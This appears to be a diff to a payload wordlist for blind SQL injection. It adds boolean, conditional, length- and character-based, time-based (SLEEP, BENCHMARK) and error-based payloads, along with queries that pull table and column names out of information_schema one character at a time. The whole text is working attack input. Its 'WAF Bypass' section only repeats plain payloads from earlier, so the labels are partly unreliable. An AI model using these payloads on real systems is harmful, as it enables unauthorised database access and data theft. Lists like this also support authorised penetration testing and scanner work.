@@ -1,4 +1,4 @@
-# Boolean-based payloads
+# Boolean-based Blind SQLi
 ' AND 1=1 --
 ' AND 1=1 /*
 ' AND 1=1 #
@@ -6,23 +6,62 @@
 ' AND 1=0 /*
 ' AND 1=0 #
 
-# Time-based payloads
+# Conditional Response
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) /*
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) #
+
+# Length-based Tests
+' AND LENGTH((SELECT version()))>0 --
+' AND LENGTH((SELECT version()))>0 /*
+' AND LENGTH((SELECT version()))>0 #
+
+# Character-based Tests
+' AND ASCII(SUBSTRING((SELECT version()),1,1))>0 --
+' AND ASCII(SUBSTRING((SELECT version()),1,1))>0 /*
+' AND ASCII(SUBSTRING((SELECT version()),1,1))>0 #
+
+# Time-based Blind SQLi
+' AND SLEEP(5) --
+' AND SLEEP(5) /*
+' AND SLEEP(5) #
+' AND BENCHMARK(1000000,MD5(1)) --
+' AND BENCHMARK(1000000,MD5(1)) /*
+' AND BENCHMARK(1000000,MD5(1)) #
+
+# Error-based Blind SQLi
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) /*
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) #
+
+# WAF Bypass
+' AND 1=1 --
+' AND 1=1 /*
+' AND 1=1 #
+' AND 1=0 --
+' AND 1=0 /*
+' AND 1=0 #
 ' AND SLEEP(5) --
 ' AND SLEEP(5) /*
 ' AND SLEEP(5) #
 
-# Conditional payloads
+# Conditional response tests
 ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 97 --
 ' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns LIMIT 1),1,1)) = 97 --
 
-# Binary search payloads
+# Data extraction techniques
 ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 128 --
 ' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) < 128 --
 
-# Bitwise payloads
+# Time-based injection
+' AND SLEEP(5) --
+' AND SLEEP(5) /*
+' AND SLEEP(5) #
+
+# Boolean-based data extraction
 ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --
 ' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 97) THEN SLEEP(5) ELSE 0 END) --
 
-# Conditional comments
+# Conditional time-based injection
 ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5))a) END) --
 ' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 97) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5))a) END) --
